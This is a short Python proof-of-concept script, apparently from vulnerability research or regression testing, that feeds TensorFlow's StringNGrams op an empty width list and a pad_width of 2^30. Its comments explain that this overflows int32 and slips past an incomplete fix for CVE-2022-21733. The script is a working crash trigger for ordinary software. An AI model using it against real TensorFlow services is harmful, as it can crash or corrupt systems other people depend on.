# 225125: preserve_short fallback path -- the S version only checks pad_width>=0 (half of the CVE-2022-21733 fix),
# and the sum data_length + 2*pad_width has no upper bound -> at 2^30, 2*2^30 overflows int32 -> negative ngram_width
import tensorflow as tf
data = tf.constant(["abc"], dtype=tf.string)
splits = tf.constant([0, 1], dtype=tf.int32)
out = tf.raw_ops.StringNGrams(
    data=data, data_splits=splits, separator=" ",
    ngram_widths=[],            # <- empty widths -> preserve_short fallback
    left_pad="", right_pad="",
    pad_width=2**30,            # <- passes the >=0 check; overflows int32 after *2
    preserve_short_sequences=True)
print("survived:", out)
